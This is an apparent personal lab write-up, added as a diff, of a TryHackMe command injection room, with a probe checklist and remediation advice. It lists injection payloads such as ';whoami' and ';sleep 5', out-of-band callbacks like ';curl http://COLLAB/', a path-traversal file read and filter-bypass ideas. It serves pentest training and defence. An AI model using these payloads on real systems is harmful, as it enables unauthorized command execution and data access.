@@ -1,0 +1,104 @@
+---
+title: "Command Injection — TryHackMe"
+date: "2025-09-26"
+platform: "TryHackMe"
+type: "Classroom"
+scope: "lab"
+tags: ["tryhackme","classroom","command-injection","rce","blind","reflected","shell","burp"]
+---
+
+# Junior Pentester (Command Injection) — TryHackMe
+**Date:** 2025-09-26  
+**Type:** Classroom  
+**Statut:** Done
+
+---
+
+## 1) Contexte
+Discover and exploit **command injection**—when untrusted input reaches an OS command executed by the application. Covers **verbose** (reflected output) vs **blind** injection, common probes, and safe, prioritized workflows. High impact (often **RCE**-class).
+
+## 2) Hypothèse de départ
+I knew the concept but wanted practical habits: how to detect quickly, confirm safely, and move from signal to impact without random guessing.
+
+## 3) Outils utilisés
+- Burp Suite (Proxy/Repeater)  
+- `curl` for fast probes & OOB callbacks  
+- Basic shell utilities (`whoami`, `id`, `pwd`, `ls`, `sleep/ping`)  
+- (Labs only) request catcher / collaborator for blind cases
+
+## 4) Approche (haut niveau)
+1. Identify inputs likely interpolated into shell commands.  
+2. Try **minimal separators first** (`;`, `&&`, `|`, backticks, `$(...)`).  
+3. If no reflection → **timing probes** (`sleep`, `ping`) or **OOB** (`curl http://collector`).  
+4. On success, enumerate safely (`whoami`, `pwd`, `ls`) before reading files.  
+5. Keep a **short, repeatable checklist**; automate common probes when needed.
+
+## 5) Résultats / preuve (sanitisé)
+- Found **verbose command injection** via the semicolon separator:
+  - Confirmed exec: `;whoami` → returned the running user.
+  - Context mapping: `;pwd`, `;ls`.
+  - Retrieved the lab flag via relative path: `;cat ../../../home/tryhackme/flag.txt`.
+- Evidence kept non-sensitive; only benign outputs and the lab flag.
+
+## 6) Remédiation recommandée
+- **Avoid shell execution** paths (`exec`, `system`, `passthru`, `popen`…); use safe APIs.  
+- **Whitelist inputs** (types/regex/enums); reject anything outside the allowed set.  
+- If shell is unavoidable: **no string concatenation**; use parameterized/system calls that bypass a shell.  
+- Run services with **least privilege**, constrain environment (AppArmor/SELinux, container profiles).  
+- Centralize validation; add monitoring for suspicious shell metacharacters in inputs.
+
+## 7) Leçons apprises
+- Command injection splits into **reflected** vs **blind**; tailor probes accordingly.  
+- A **prioritized checklist** beats guesswork: separators → timing → OOB → safe enum.  
+- Filters are fragile; robust defense = remove dangerous exec + strict allowlists + least privilege.  
+- Small, high-signal probes (`;whoami`) accelerate discovery and reduce noise.
+
+## 8) Liens / ressources
+- TryHackMe — Junior Pentester (Command Injection module)  
+- OWASP: Command Injection & Injection Cheat Sheets  
+- PortSwigger Web Security Academy — Command Injection labs  
+- (Lien vers la note Notion détaillée)
+
+---
+
+### Issue → Solution (trouver `;` plus vite)
+**Question:** Could I have guessed faster to use `;`?  
+**Answer:** Yes. Put separators at the **top** of your probe list—most shells accept `;` to chain commands. Quick sequence:
+- `;whoami` → `&&whoami` → `|whoami` → `` `whoami` `` → `$(whoami)`  
+- If silent: `;sleep 5` / `;ping -c 4 127.0.0.1` or OOB `;curl http://collector/`.
+
+---
+
+> **Snippet**
+> 
+> ```
+> Command Injection – quick discovery & exploit checklist
+> 
+> 1) Context:
+>    - Does input feed a system command? (ping/traceroute/file ops/uploads)
+> 
+> 2) Fast probes (reflected):
+>    ;whoami
+>    &&whoami
+>    |whoami
+>    `whoami`
+>    $(whoami)
+> 
+> 3) If blind:
+>    ;sleep 5                 # Linux
+>    ;ping -c 4 127.0.0.1
+>    & timeout /T 5           # Windows
+>    ;curl http://COLLAB/     # OOB (labs only)
+> 
+> 4) Safe enum on success:
+>    ;id ; pwd
+>    ;ls -la
+>    ;echo $USER $SHELL 2>/dev/null
+> 
+> 5) Bypass ideas:
+>    - URL-encode (%3B), alt quoting/encodings, newline injection
+> 
+> 6) Remediation (for report):
+>    - Root cause: unsafe exec of user input
+>    - Fix: remove shell calls; strict allowlists; least-privilege service user
+> ```
